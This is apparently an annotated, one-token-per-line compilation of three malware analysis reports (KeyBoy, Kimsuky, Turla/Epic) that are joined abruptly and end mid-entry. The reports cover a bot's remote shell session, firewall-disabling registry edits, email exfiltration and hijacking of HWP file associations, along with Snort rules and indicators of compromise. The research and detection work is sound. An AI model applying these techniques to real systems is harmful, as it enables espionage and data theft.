192.168.56.110 B_ip.cncsvr
'
,
1443
)
$login$
192.168.56.110 B_ip.unknown

MyUser
2013/06/07
02:18:35

Proxy
20130401

[+]
Authenticating
on
the
bot

OnLine

Pw_OK

When
the
authentication
is
confirmed
,
we
are
prompted
with
a
shell
through
which
we
can
interact
in
real-time
with
the
bot
.

The
messages
we
previously
identified
represent
the
actual
commands
that
can
be
sent
to
the
bot
:

Sysinfo
:
returns
detailed
information
on
the
computer
(
pretty
much
the
output
of
systeminfo);
the
bot
will
respond
with
a
message
with
the
header
$sysinfo$
.

FileManager
:
interact
with
all
the
disks
available
on
the
victim
system;
the
bot
will
respond
with
a
message
with
the
header
$fileManager$
.

Download
:
download
a
file
from
the
compromised
system;
the
bot
will
respond
with
a
message
with
the
header
$fileDownload$
.

UploadFileOk
:
upload
a
file
to
the
compromised
system;
the
bot
will
respond
with
a
message
with
the
header
$fileUpload$
.

Most
interestingly
the
command
Shell
spawns
a
Windows
command
shell
that
we
can
control
remotely
:

shell>
Shell
$shell$

Microsoft
Windows
XP
[Version
5.1.2600]
(
C
)
Copyright
1985-2001
Microsoft
Corp
.

C:\WINDOWS\system32>
shell>
tasklist
$shell$
tasklist
$shell$

Image
Name
PID
Session
Name
Session#
Mem
Usage
=========================
======
================
========
============

System
Idle
Process

0
Console

0

28
K

System

4
Console

0

236
K

smss.exe

368
Console

0

388
K

csrss.exe

584
Console

0

3,740
K

winlogon.exe

608
Console

0

4,312
K

services.exe

652
Console

0

3,368
K

lsass.exe

664
Console

0

6,152
K

VBoxService.exe

820
Console

0

3,092
K

svchost.exe

864
Console

0

4,696
K

svchost.exe

952
Console

0

4,252
K

svchost.exe

1044
Console

0

20,424
K

svchost.exe

1100
Console

0

3,584
K

svchost.exe

1160
Console

0

4,268
K

spoolsv.exe

1428
Console

0

4,996
K

explorer.exe

1656
Console

0

29,944
K

VBoxTray.exe

1820
Console

0

3,620
K

GrooveMonitor.exe

1868
Console

0

4,340
K

ctfmon.exe

1888
Console

0

3,148
K

jqs.exe

2040
Console

0

1,396
K

vmware-usbarbitrator.exe

248
Console

0

3,180
K

alg.exe

1380
Console

0

3,440
K

wscntfy.exe

1692
Console

0

1,804
K

wuauclt.exe

1116
Console

0

6,568
K

svchost.exe

796
Console

0

4,088
K

cmd.exe

480
Console

0

2,624
K

tasklist.exe

724
Console

0

4,068
K

wmiprvse.exe

1256
Console

0

5,544
K

C:\WINDOWS\system32>

While
the
interaction
with
the
bots
could
also
be
scripted
,
it
might
be
plausible
that
the
operators
of
these
intrusions
might
be
interacting
with
their
targets
exclusively
manually
to
collect
different
data
depending
on
each
individual
they
infected
and
the
goals
they
had
set
for
the
attack
.

Detecting
Infections

While
these
are
clearly
not
widespread
attacks
and
,
as
in
any
other
targeted
attack
case
,
we
should
not
create
alarmism
for
threats
that
are
likely
irrelevant
for
the
majority
of
organizations
,
we
want
to
share
a
few
indicators
that
might
help
identify
infections
or
assist
in
further
research
by
whoever
is
interested
in
this
campaign
.

Firstly
,
thanks
to
the
fixed
patterns
used
by
the
malware
in
the
authentication
procedure
,
we
can
detect
outbound
traffic
from
infected
hosts
with
the
following
simple
Snort
rule
:

alert
tcp
$HOME_NET
any
->
$EXTERNAL_NET
any
(
msg:'KeyBoy
Backdoor
Login';
flow:to_server;
content:'|c4
4c
87
3f
11
1e
c4
1a|';
depth:8;
sid:1000001;
rev:1;
classtype:trojan-activity;
reference:url,community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar
geted-attacksagainst-vietnam-and-india
)

The
simplest
way
to
identify
an
infection
on
a
given
Windows
system
,
is
just
to
look
for
the
existence
of
the
file
C:\WINDOWS\system32\CREDRIVER.dll
or
of
a
service
called
MdAdum
.

We
also
created
a
couple
of
Yara
rules
that
you
can
use
to
scan
your
systems
your
collection
of
malware
samples
to
identify
copies
of
KeyBoy B_malware.backdoor
:

Conclusions

Not
a
day
passes
by
without
hearing
of
someone
hit
by
a
targeted
attack
.

Recently
the
growth
of
amount
and
scale
of
targeted
attacks
has
come
to
the
point
were
they
are
starting
to
look
more
like
opportunistic
carpet
bombings
rather
than
ninja
strikes
.

It's
common
to
observe
attacks
pulled
off
successfully
without
any
particular
sophistication
in
place
,
including
the
incidents
described
in
this
post
.

It's
also
getting
quite
difficult
to
attribute
the
attacks
to
any
state-sponsored
unit
,
both
because
there's
a
generic
lack
of
strong
evidence
in
such
incidents
(
which
is
why
we
refrained
from
making
any
statement
on
the
origin
of
these
intrusions
)
but
frankly
also
because
almost
anybody
could
operate
such
campaigns
and
be
reasonably
successful
.

The
only
differentiation
between
actors
at
this
point
exclusively
relies
on
identifying
the
motivations
and
the
context
.

Beware
though
,
just
because
these
attacks
are
conceptually
targeted
,
it
doesn't
necessarily
mean
that
they
should
have
a
higher
priority
than
any
other
threat
on
your
security
program
.

Our
suggestion
remains
the
same
:
identify
your
core
assets
,
recognize
the
most
impactful
threats
to
such
assets
and
inform
and
protect
yourself
accordingly
.

This
research
was
brought
to
you
by
Claudio
Guarnieri
and
Mark
Schloesser
from
Rapid7
Labs
.
The
'
Kimsuky B_malware.drop
'
Operation
:
A
North
Korean
APT
?

For
several
months
,
we
have
been
monitoring
an
ongoing
cyber-espionage
campaign
against
South
Korean
think
-
tanks
.

There
are
multiple
reasons
why
this
campaign
is
extraordinary
in
its
execution
and
logistics
.

It
all
started
one
day
when
we
encountered
a
somewhat
unsophisticated
spy
program
that
communicated
with
its
'
master
'
via
a
public
e-mail
server
.

This
approach
is
rather
inherent
to
many
amateur
virus-writers
and
these
malware
attacks
are
mostly
ignored
.

However
,
there
were
a
few
things
that
attracted
our
attention
:

The
public
e-mail
server
in
question
was
Bulgarian
-
mail.bg
.

The
compilation
path
string
contained
Korean
hieroglyphs
.

These
two
facts
compelled
us
take
a
closer
look
at
this
malware
--
Korean
compilers
alongside
Bulgarian
email
command
-
and
-
control
communications
.

The
complete
path
found
in
the
malware
presents
some
Korean
strings
:

D:rsh(cid:2)(cid:1)UAC_dll((cid:4)(cid:3))Releasetest.pdb

The
'
rsh
'
word
,
by
all
appearances
,
means
a
shortening
of
'
Remote
Shell
'
and
the
Korean
words
can
be
translated
in
English
as
'
attack
'
and
'
completion
'
,
i.e.
:

D:rshATTACKUAC_dll(COMPLETION)Releasetest.pdb

Although
the
full
list
of
victims
remains
unknown
,
we
managed
to
identify
several
targets
of
this
campaign
.

According
to
our
technical
analysis
,
the
attackers
were
interested
in
targeting
following
organizations
'
.

The
Sejong
Institute

The
Sejong
Institute
is
a
non
-
profit
private
organization
for
public
interest
and
a
leading
think
tank
in
South
Korea
,
conducting
research
on
national
security
strategy
,
unification
strategy
,
regional
issues
,
and
international
political
economy
.

Korea
Institute
For
Defense
Analyses
(
KIDA
)

KIDA
is
a
comprehensive
defense
research
institution
that
covers
a
wide
range
of
defense-related
issues
.

KIDA
is
organized
into
seven
research
centers
:
the
Center
for
Security
and
Strategy;
the
Center
for
Military
Planning;
the
Center
for
Human
Resource
Development;
the
Center
for
Resource
Management;
the
Center
for
Weapon
Systems
Studies;
the
Center
for
Information
System
Studies;
and
the
Center
for
Modeling
and
Simulation
.

KIDA
also
has
an
IT
Consulting
Group
and
various
supporting
departments
.

KIDA's
mission
is
to
contribute
to
rational
defense
policy
-
making
through
intensive
and
systematic
research
and
analysis
of
defense
issues
.

Ministry
of
Unification

The
Ministry
of
Unification
is
an
executive
department
of
the
South
Korean
government
responsible
for
working
towards
the
reunification
of
Korea
.

Its
major
duties
are
:
establishing
North
Korea
Policy
,
coordinating
inter-Korean
dialogue
,
pursuing
inter
-
Korean
cooperation
and
educating
the
public
on
unification
.

Hyundai
Merchant
Marine

Hyundai
Merchant
Marine
is
a
South
Korean
logistics
company
providing
worldwide
container
shipping
services
.

Some
clues
also
suggest
that
computers
belonging
to
'
The
supporters
of
Korean
Unification
'
(
http://www.unihope.kr/ B_url.unknown
)
were
also
targeted
.

Among
the
organizations
we
counted
,
11
are
based
in
South
Korea
and
two
entities
reside
in
China
.

Partly
because
this
campaign
is
very
limited
and
highly
targeted
,
we
have
not
yet
been
able
to
identify
how
this
malware
is
being
distributed
.

The
malicious
samples
we
found
are
the
early
stage
malware
most
often
delivered
by
spear
-
phishing
e-mails
.

Infecting
a
system

The
initial
Trojan
dropper
is
a
Dynamic
Link
Library
functioning
as
a
loader
for
further
malware
.

It
does
not
maintain
exports
and
simply
delivers
another
encrypted
library
maintained
in
its
resource
section
.

This
second
library
performs
all
the
espionage
functionality
.

When
running
on
Windows
7
,
the
malicious
library
uses
the
Metasploit
Framework's
open-source
code
Win7Elevate
to
inject
malicious
code
into
explorer.exe
.

In
any
case
,
be
it
Windows
7
or
not
,
this
malicious
code
decrypts
its
spying
library
from
resources
,
saves
it
to
disk
with
an
apparently
random
but
hardcoded
name
,
for
example
,
~DFE8B437DD7C417A6D.TMP
,
in
the
user's
temporary
folder
and
loads
this
file
as
library
.

This
next
stage
library
copies
itself
into
the
System32
directory
of
the
Windows
folder
after
the
hardcoded
file
name
--
either
KBDLV2.DLL
or
AUTO.DLL
,
depending
on
the
malware
sample
.

Then
the
service
is
created
for
the
service
dll
.
Service
names
also
can
differ
from
version
to
version;
we
discovered
the
following
names
--
DriverManage
,
WebService
and
WebClientManager
.

These
functions
assure
malware
persistence
in
a
compromised
OS
between
system
reboots
.

At
this
stage
,
the
malware
gathers
information
about
the
infected
computer
.

This
includes
an
output
of
the
systeminfo
command
saved
in
the
file
oledvbs.inc
by
following
the
hardcoded
path
:
C:Program

FilesCommon
FilesSystemOle
DBoledvbs.inc
.

There
is
another
function
called
-
the
malware
creates
a
string
containing
computer
and
user
names
but
this
isn't
used
anywhere
.

By
all
appearances
,
this
is
a
mistake
by
the
malware
author
.

Later
on
,
we
will
come
to
a
function
where
such
a
string
could
be
pertinent
but
the
malware
is
not
able
to
find
this
data
in
the
place
where
it
should
be
.

These
steps
are
taken
only
if
it's
running
on
an
infected
system
for
the
first
time
.

At
system
startup
,
the
malicious
library
performs
spying
activities
when
it
confirms
that
it
is
loaded
by
the
generic
svchost.exe
process
.

Spying
modules

There
are
a
lot
of
malicious
programs
involved
in
this
campaign
but
,
strangely
,
they
each
implement
a
single
spying
function
.

Besides
the
basic
library
(
KBDLV2.DLL
/
AUTO.DLL
)
that
is
responsible
for
common
communication
with
its
campaign
master
,
we
were
able
to
find
modules
performing
the
following
functions
:

Keystroke
logging

Directory
listing
collection

HWP
document
theft

Remote
control
download
and
execution

Remote
control
access

Disabling
firewall

At
system
startup
,
the
basic
library
disables
the
system
firewall
and
any
AhnLab
firewall
(
a
South
Korean
security
product
vendor
)
by
zeroing
out
related
values
in
registry
:

SYSTEMCurrentControlSetServicesSharedAccessParameters

FirewallPolicyStandardProfile

EnableFirewall
=
0

SYSTEMCurrentControlSetServicesSharedAccessParameters

FirewallPolicyPublicProfile

EnableFirewall
=
0

HKLMSOFTWAREAhnLabV3IS2007InternetSec

FWRunMode
=
0

HKLMSOFTWAREAhnlabV3IS80is
fwmode
=
0

It
also
turns
off
the
Windows
Security
Center
service
to
prevent
alerting
the
user
about
the
disabled
firewall
.

It
is
not
accidental
that
the
malware
author
has
singled
out
AhnLab's
security
product
.

During
our
Winnti
research
,
we
learnt
that
one
of
the
Korean
victims
was
severely
criticized
by
South
Korean
regulators
for
using
foreign
security
products
.

We
do
not
know
for
sure
how
this
criticism
affected
other
South
Korean
organizations
,
but
we
do
know
that
many
South
Korean
organizations
install
AhnLab
security
products
.

Accordingly
,
these
attackers
don't
even
bother
evading
foreign
vendors
'
products
,
because
their
targets
are
solely
South
Korean
.

Once
the
malware
disables
the
AhnLab
firewall
,
it
checks
whether
the
file
taskmgr.exe
is
located
in
the
hardcoded
C:WINDOWS
folder
.

If
the
file
is
present
,
it
runs
this
executable
.

Next
,
the
malware
loops
every
30
minutes
to
report
itself
and
wait
for
response
from
its
operator
.

Communications

Communication
between
bot
and
operator
flows
through
the
Bulgarian
web
-
based
free
email
server
(
mail.bg
)
.
The
bot
maintains
hardcoded
credentials
for
its
e-mail
account
.

After
authenticating
,
the
malware
sends
e-mails
to
another
specified
e-mail
address
,
and
reads
e-mails
from
the
inbox
.
All
these
activities
are
performed
via
the
'
mail.bg
'
web-interface
with
the
use
of
the
system
Wininet
API
functions
.

From
all
the
samples
that
we
managed
to
obtain
,
we
extracted
the
following
email
accounts
used
in
this
campaign
:

beautifl@mail.bg

ennemyman@mail.bg

fasionman@mail.bg

happylove@mail.bg

lovest000@mail.bg

monneyman@mail.bg

sportsman@mail.bg

veryhappy@mail.bg

Here
are
the
two
'
master
'
email
addresses
to
which
the
bots
send
e-mails
on
behalf
of
the
abovementioned
accounts
.

They
report
on
status
and
transmit
infected
system
information
via
attachments
:

iop110112@hotmail.com

rsh1213@hotmail.com

Regular
reporting

To
report
infection
status
,
the
malware
reads
from
C:Program
FilesCommon
FilesSystemOleDBoledvbs.inc
which
contains
the
systeminfo
command
output
.

If
the
file
exists
,
it
is
deleted
after
reading
.

Then
,
it
reads
user
-
related
info
from
the
file
sqlxmlx.inc
in
the
same
folder
(
we
can
see
strings
referencing
to
'
UserID
'
commentary
in
this
part
of
the
code
)
.

But
this
file
was
never
created
.

As
you
recall
,
there
is
a
function
that
should
have
collected
this
data
and
should
have
saved
it
into
this
sqlxmlx.inc
file
.

However
,
on
the
first
launch
,
the
collected
user
information
is
saved
into
'
xmlrwbin.inc
'
.

This
effectively
means
that
the
malware
writer
mistakenly
coded
the
bot
to
save
user
information
into
the
wrong
file
.

There
is
a
chance
for
the
mistaken
code
to
still
work
--
user
information
could
be
copied
into
the
send
information
heap
.

But
not
in
this
case
-
at
the
time
of
writing
,
the
gathered
user
information
variable
which
should
point
to
the
xmlrwbin.inc
filename
has
not
yet
been
initialized
,
causing
the
file
write
to
fail
.

We
see
that
sqlxmlx.inc
is
not
created
to
store
user
information
.

Next
,
the
intercepted
keystrokes
are
read
from
the
file
and
sent
to
the
master
.

Keystrokes
are
logged
and
kept
in
an
ordinary
and
consistent
format
in
this
file
-
both
the
names
of
windows
in
which
keys
were
typed
and
the
actual
sequence
of
keyboard
entry
.

This
data
is
found
in
the
file
C:Program
FilesCommon
FilesSystemOle
DBmsolui80.inc
created
by
the
external
key
logger
module
.

All
this
data
is
merged
in
one
file
xmlrwbin.inc
,
which
is
then
encrypted
with
RC4
.

The
RC4
key
is
generated
as
an
MD5
hash
of
a
randomly
generated
117-bytes
buffer
.

To
be
able
to
decipher
the
data
,
the
attacker
should
certainly
know
either
the
MD5
hash
or
the
whole
buffer
content
.

This
data
is
also
sent
,
but
RSA
encrypted
.

The
malware
constructs
a
1120
bit
public
key
,
uses
it
to
encrypt
the
117-bytes
buffer
.

The
malware
then
concatenates
all
the
data
to
be
sent
as
a
128-bytes
block
.

The
resulting
data
is
saved
in
C:Program
FilesCommon
FilesSystemOle
DB
to
a
file
named
according
to
the
following
format
:
'
<system
time>_<account
at
Bulgarian
email
server>.txt
'
,
for
example
,
'
08191757_beautifl@mail.bg.txt
'
.

The
file
is
then
attached
to
an
e-mail
and
sent
to
the
master's
e-mail
account
.

Following
transmission
,
it
is
immediately
deleted
from
the
victim
system
.

Getting
the
master's
data

The
malware
also
retrieves
instructions
from
the
mail
server
.

It
checks
for
mails
in
its
Bulgarian
e-mail
account
with
a
particular
subject
tag
.

We
have
identified
several
'
subject
tags
'
in
the
network
communication
:
Down_0
,
Down_1
,
Happy_0
,
Happy_2
and
ddd_3
.

When
found
and
the
e-mail
maintains
an
attachment
,
the
malware
downloads
this
attachment
and
saves
it
with
filename
'
msdaipp.cnt
'
in
C:Program
FilesCommon
FilesSystemOle
DB
.

The
attacker
can
send
additional
executables
in
this
way
.

The
executables
are
RC4
encrypted
and
then
attached
.

The
key
for
decryption
is
hardcoded
in
the
malicious
samples
.

It's
interesting
that
the
same
'
rsh!@!#
'
string
is
maintained
across
all
known
samples
and
is
used
to
generate
RC4
keys
.

As
described
earlier
,
the
malware
computes
the
MD5
of
this
string
and
uses
the
hash
as
its
RC4
key
to
decrypt
the
executable
.

Then
,
the
plain
executable
is
dropped
onto
disk
as
'
sqlsoldb.exe
'
and
run
,
and
then
moved
to
the
C:Windows
folder
with
the
file
name
'
taskmgr.exe
'
.

The
original
e-mail
and
its
attachment
are
then
deleted
from
the
Bulgarian
e-mail
inbox
.

Key
logger

The
additional
key
logger
module
is
not
very
complex
--
it
simply
intercepts
keystrokes
and
writes
typed
keys
into
C:Program
FilesCommon
FilesSystemOle
DBmsolui80.inc
,
and
also
records
the
active
window
name
where
the
user
pressed
keys
.

We
saw
this
same
format
in
the
Madi B_malware.drop
malware
.

There
is
also
one
key
logger
variant
that
logs
keystrokes
into
C:WINDOWSsetup.log
.

Directory
listing
collector

The
next
program
sent
to
victims
enumerates
all
the
drives
on
the
infected
system
and
executes
the
following
command
on
them
:

dir
<drive
letter>
:
/a
/s
/t
/-c

In
practice
,
this
command
is
written
to
C:WINDOWSmsdatt.bat
and
executed
with
output
redirected
to
C:WINDOWSmsdatl3.inc
.

As
a
result
,
the
latter
maintains
a
listing
of
all
files
in
all
the
folders
on
the
drive
.

The
malware
later
reads
that
data
and
appends
it
to
content
of
the
file
C:Program
FilesCommon
FilesSystemOle
DBoledvbs.inc
.

At
this
point
,
'
oledvbs.inc
'
already
stores
systeminfo
output
.

It's
interesting
that
one
sample
of
the
directory
listing
collector
was
infected
with
the
infamous
'
Viking B_malware.drop
'
virus
of
Chinese
origin
.

Some
of
this
virus
'
modifications
were
wandering
in
the
wild
for
years
and
its
authors
or
operators
would
never
expect
to
see
it
end
up
in
a
clandestine
APT
-
related
spying
tool
.

For
the
attackers
,
this
is
certainly
a
big
failure
.

Not
only
does
the
original
spying
program
have
marks
of
wellknown
malware
that
can
be
detected
by
anti
-
malware
products;
moreover
the
attackers
are
revealing
their
secret
activities
to
cyber
-
criminal
gangs
.

However
,
by
all
appearances
,
the
attackers
noticed
the
unwanted
addition
to
their
malware
and
got
rid
of
the
infection
.

This
was
the
only
sample
bearing
the
Viking B_malware.drop
virus
.

Due
to
expensive
work
of
malware
with
variety
of
additional
files
,
it's
not
out
of
place
to
show
these
'
relationships
'
in
a
diagram
:

HWP
document
stealer

This
module
intercepts
HWP
documents
on
an
infected
computer
.

The
HWP
file
format
is
similar
to
Microsoft
Word
documents
,
but
supported
by
Hangul
,
a
South
Korean
word
processing
application
from
the
Hancom
Office
bundle
.

Hancom
Office
is
widely
used
in
South
Korea
.

This
malware
module
works
independently
of
the
others
and
maintains
its
own
Bulgarian
e-mail
account
.

The
account
is
hardcoded
in
the
module
along
with
the
master's
e-mail
to
which
it
sends
intercepted
documents
.

It
is
interesting
that
the
module
does
not
search
for
all
the
HWP
files
on
infected
computer
,
but
reacts
only
to
those
that
are
opened
by
the
user
and
steals
them
.

This
behavior
is
very
unusual
for
a
document
-
stealing
component
and
we
do
not
see
it
in
other
malicious
toolkits
.

The
program
copies
itself
as
<Hangul
full
path>HncReporter.exe
and
changes
the
default
program
association
in
the
registry
to
open
HWP
documents
.

To
do
so
,
it
alters
following
registry
values
:

HKEY_CLASSES_ROOTHwp.Document.7shellopencommand

HKEY_CLASSES_ROOTHwp.Document.8shellopencommand

By
default
,
there
is
the
registry
setting
'
<Hangul
full
path>Hwp.exe
'
'
%1
'
associating
Hangul
application
'
Hwp.exe
'
with
.HWP
documents
.

But
the
malicious
program
replaces
this
string
with
the
following
:
'
<Hangul
full
path>HncReporter.exe
'
'
%1
'
.

So
,
when
the
user
is
opening
any
.HWP
document
,
the
malware
program
itself
is
executed
to
open
the
.HWP
document
.

Following
this
registry
edit
,
any
opened
.HWP
document
is
read
and
sent
as
an
e-mail
attachment
with
the
subject
'
Hwp
'
to
the
attackers
.

After
sending
,
the
malware
executes
the
real
Hangul
word
processing
application
'
Hwp.exe
'
to
open
the
.HWP
document
as
the
user
intended
.

The
means
the
victim
most
likely
will
not
notice
the
theft
of
the
.HWP
file
.

The
module's
sending
routine
depends
on
the
following
files
in
C:Program
FilesCommon
FilesSystemOle
DB
folder
:
xmlrwbin.inc
,
msdaipp.cnt
,
msdapml.cnt
,
msdaerr.cnt
,
msdmeng.cnt
and
oledjvs.inc
.

Remote
control
module
downloader

An
extra
program
is
dedicated
exclusively
to
download
attachments
out
of
incoming
e-mails
with
a
particular
subject
tag
.

This
program
is
similar
to
the
pivot
module
but
with
reduced
functionality
:
it
maintains
the
hardcoded
Bulgarian
e-mail
account
,
logs
in
,
reads
incoming
e-mails
and
searches
for
the
special
subject
tag
'
Team
'
.

When
found
,
it
loads
the
related
attachment
,
drops
it
onto
the
hard
drive
as
C:Program
FilesCommon
FilesSystemOle
DBtaskmgr.exe
and
executes
.

This
particular
executable
arrives
without
any
encryption
.

Remote
control
module

It
is
also
interesting
that
the
malware
author
did
not
custom
develop
a
backdoor
program
.

Instead
,
the
author
modified
TeamViewer
client
version
5.0.9104
.

The
initial
executable
pushed
by
attackers
in
e-mails
related
to
the
remote
control
module
consists
of
three
more
executables
.

Two
of
them
are
Team
Viewer
components
themselves
,
and
another
is
some
sort
of
backdoor
loader
.

So
,
the
dropper
creates
three
files
in
the
C:WindowsSystem32
directory
:
netsvcs.exe
-
the
modified
Team
Viewer
client;
netsvcs_ko.dll
-
resources
library
of
Team
Viewer
client;
vcmon.exe
-
installer
/
starter
;
and
creates
the
service
'
Remote
Access
Service
'
,
adjusted
to
execute
C:WindowsSystem32vcmon.exe
at
system
startup
.

Every
time
the
vcmon.exe
is
executed
,
it
disables
AhnLab's
firewall
by
zeroing
out
following
registry
values
:

HKLMSOFTWAREAhnLabV3
365
ClinicInternetSec

UseFw
=
0

UseIps
=
0

Then
,
it
modifies
the
Team
Viewer
registry
settings
.

As
we
said
,
the
Team
Viewer
components
used
in
this
campaign
are
not
the
original
ones
.

They
are
slightly
modified
.

In
total
,
we
found
two
different
variants
of
changed
versions
.

The
malware
author
replaced
all
the
entries
of
'
Teamviewer
'
strings
in
Team
Viewer
components
.

In
the
first
case
with
the
'
Goldstager
'
string
and
with
the
string
'
Coinstager
'
in
the
second
.

TeamViewer
client
registry
settings
are
then
HKLMSoftwareGoldstagerVersion5
and
HKLMSoftwareCoinstagerVersion5
correspondingly
.

The
launcher
sets
up
several
registry
values
that
control
how
the
remote
access
tool
will
work
.

Among
them
is
SecurityPasswordAES
.

This
parameter
represents
a
hash
of
the
password
with
which
a
remote
user
has
to
connect
to
Team
Viewer
client
.

This
way
,
the
attackers
set
a
pre-shared
authentication
value
.

After
that
,
the
starter
executes
the
very
Team
Viewer
client
netsvcs.exe
.

Who's
Kim
?

It's
interesting
that
the
drop
box
mail
accounts
iop110112@hotmail.com
and
rsh1213@hotmail.com
are
registered
with
the
following
'
kim
'
names
:
kimsukyang
and
'
Kim
asdfa
'
.

Of
course
,
we
can't
be
certain
that
these
are
the
real
names
of
the
attackers
.

However
,
the
selection
isn't
frequently
seen
.

Perhaps
it
also
points
to
the
suspected
North
Korean
origin
of
attack
.

Taking
into
account
the
profiles
of
the
targeted
organizations
--
South
Korean
universities
that
conduct
researches
on
international
affairs
,
produce
defense
policies
for
government
,
national
shipping
company
,
supporting
groups
for
Korean
unification
--
one
might
easily
suspect
that
the
attackers
might
be
from
North
Korea
.

The
targets
almost
perfectly
fall
into
their
sphere
of
interest
.

On
the
other
hand
,
it
is
not
that
hard
to
enter
arbitrary
registration
information
and
misdirect
investigators
to
an
obvious
North
Korean
origin
.

It
does
not
cost
anything
to
concoct
fake
registration
data
and
enter
kimsukyang
during
a
Hotmail
registration
.

We
concede
that
this
registration
data
does
not
provide
concrete
,
indisputable
information
about
the
attackers
.

However
,
the
attackers
'
IP-addresses
do
provide
some
additional
clues
.

During
our
analysis
,
we
observed
ten
IP-addresses
used
by
the
Kimsuky B_malware.drop
operators
.

All
of
them
lie
in
ranges
of
the
Jilin
Province
Network
and
Liaoning
Province
Network
,
in
China
.

No
other
IP-addresses
have
been
uncovered
that
would
point
to
the
attackers
'
activity
and
belong
to
other
IP-ranges
.

Interestingly
,
the
ISPs
providing
internet
access
in
these
provinces
are
also
believed
to
maintain
lines
into
North
Korea
.

Finally
,
this
geo-location
supports
the
likely
theory
that
the
attackers
behind
Kimsuky B_malware.drop
are
based
in
North
Korea
.

Appendix B_hash

Files
used
by
malware
:

%windir%system32kbdlv2.dll

%windir%system32auto.dll

%windir%system32netsvcs.exe

%windir%system32netsvcs_ko.dll

%windir%system32vcmon.exe

%windir%system32svcsmon.exe

%windir%system32svcsmon_ko.dll

%windir%system32wsmss.exe

%temp%~DFE8B437DD7C417A6D.TMP

%temp%~DFE8B43.TMP

%temp%~tmp.dll

C:Windowstaskmgr.exe

C:Windowssetup.log

C:Windowswinlog.txt

C:Windowsupdate.log

C:Windowswmdns.log

C:Windowsoledvbs.inc

C:Windowsweoig.log

C:Windowsdata.dat

C:Windowssys.log

C:WindowsPcMon.exe

C:WindowsGoogleUpdate.exe

C:WindowsReadMe.log

C:Windowsmsdatt.bat

C:Windowsmsdatl3.inc

C:Program
FilesCommon
FilesSystemOle
DBmsdmeng.cnt

C:Program
FilesCommon
FilesSystemOle
DBxmlrwbin.inc

C:Program
FilesCommon
FilesSystemOle
DBmsdapml.cnt

C:Program
FilesCommon
FilesSystemOle
DBsqlsoldb.exe

C:Program
FilesCommon
FilesSystemOle
DBoledjvs.inc

C:Program
FilesCommon
FilesSystemOle
DBoledvbs.inc

C:Program
FilesCommon
FilesSystemOle
DBmsolui80.inc

C:Program
FilesCommon
FilesSystemOle
DBmsdaipp.cnt

C:Program
FilesCommon
FilesSystemOle
DBmsdaerr.cnt

C:Program
FilesCommon
FilesSystemOle
DBsqlxmlx.inc

<Hangulfullpath>HncReporter.exe

Related
MD5
:

3baaf1a873304d2d607dbedf47d3e2b4 B_hash

3195202066f026de3abfe2f966c9b304 B_hash

4839370628678f0afe3e6875af010839 B_hash

173c1528dc6364c44e887a6c9bd3e07c B_hash

191d2da5da0e37a3bb3cbca830a405ff B_hash

5eef25dc875cfcb441b993f7de8c9805 B_hash

b20c5db37bda0db8eb1af8fc6e51e703 B_hash

face9e96058d8fe9750d26dd1dd35876 B_hash

9f7faf77b1a2918ddf6b1ef344ae199d B_hash

d0af6b8bdc4766d1393722d2e67a657b B_hash

45448a53ec3db51818f57396be41f34f B_hash

80cba157c1cd8ea205007ce7b64e0c2a B_hash

f68fa3d8886ef77e623e5d94e7db7e6c B_hash

4a1ac739cd2ca21ad656eaade01a3182 B_hash

4ea3958f941de606a1ffc527eec6963f B_hash

637e0c6d18b4238ca3f85bcaec191291 B_hash

b3caca978b75badffd965a88e08246b0 B_hash

dbedadc1663abff34ea4bdc3a4e03f70 B_hash

3ae894917b1d8e4833688571a0573de4 B_hash

d94f7a8e6b5d7fc239690a7e65ec1778 B_hash

8a85bd84c4d779bf62ff257d1d5ab88b B_hash

f1389f2151dc35f05901aba4e5e473c7 B_hash

96280f3f9fd8bdbe60a23fa621b85ab6 B_hash

122c523a383034a5baef2362cad53d57 B_hash

f25c6f40340fcde742018012ea9451e0 B_hash

2173bbaea113e0c01722ff8bc2950b28 B_hash

ffad0446f46d985660ce1337c9d5eaa2 B_hash

2a0b18fa0887bb014a344dc336ccdc8c B_hash

81b484d3c5c347dc94e611bae3a636a3 B_hash

ab73b1395938c48d62b7eeb5c9f3409d B_hash


69930320259ea525844d910a58285e15 B_hash

Names
of
services
created
by
malware
:

DriverManage

WebService

WebClientManager

Remote
Access
Service

We
detect
these
threats
as
Trojan.Win32.Kimsuky B_malware.infosteal
except
modified
Team
Viewer
client
components
which
are
detected
as
Trojan.Win32.Patched.ps B_malware.infosteal
.
The
Epic B_malware.backdoor
Turla
Operation
:

Solving
some
of
the
mysteries
of
Snake
/
Uroboros

Kaspersky
Lab
Global
Research
and
Analysis
Team

Version
1.0

August
6
,
2014

Technical
appendix
:
malware
samples
and
indicators
of
compromise
(
IOC
)

A
.
Keylogger
module

File
name
:
varies

MD5
:
a3cbf6179d437909eb532b7319b3dafe B_hash

Compilation
timestamp
:
2012.10.02
10:51:50
(
GMT
)

Compiler
:
Microsoft
Visual
Studio
2010

File
format
:
PE32
DLL

Exports
:
_LowLevelKeyboardProc@12

Creates
the
log
file
:
%TEMP%\~DFD3O8.tmp
.

If
failed
,
tries
to
write
to
the
file
f:\keyhook.log

Each
time
the
keylogger
starts
,
it
appends
the
following
header
to
the
log
file
:
--------------------------------------------------------------------------------

New
Session
:
%fully
qualified
computer
name%
%timestamp%

--------------------------------------------------------------------------------

It
then
creates
a
hidden
console
window
and
registers
its
only
export
_LowLevelKeyboardProc@12
as
a
hook
procedure
for
low-level
keyboard
input
events
(
WH_KEYBOARD_LL
hook
)
.

Depending
on
the
results
,
it
writes
a
line
to
its
log
file
.

In
case
the
hook
was
installed
,
the
line
is
'
Started
...
'
,
else
'
LoadLibrary
'
%path
to
its
file%
'
failed
,
%error
code%
'
.

It
also
starts
a
thread
that
retrieves
the
current
foreground
window
handle
every
100
milliseconds
.

This
handle
is
then
used
in
the
keyboard
hook
procedure
.

The
low-level
keyboard
hook
procedure
intercepts
WM_KEYDOWN
,
WM_KEYUP
and
WM_SYSKEYDOWN
system
messages
and
writes
information
about
each
keystroke
to
the
log
file
.

Every
time
a
new
window
becomes
active
,
it
retrieves
its
name
and
the
path
to
its
application
and
writes
this
information
to
the
log
file
:

[%path
to
the
application's
executable
file%
:
'
%window
title%']

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

3

B
.
The
'
Epic B_malware.backdoor
/
Tavdig B_malware.backdoor
/
Wipbot B_malware.backdoor
'
backdoor
(
Main
backdoor
module
)

Analyzed
file
(
others
are
similar
)
:

Compilation
timestamp
:
2013.10.15
10:43:09
(
GMT
)

File
format
:
PE32
DLL
,
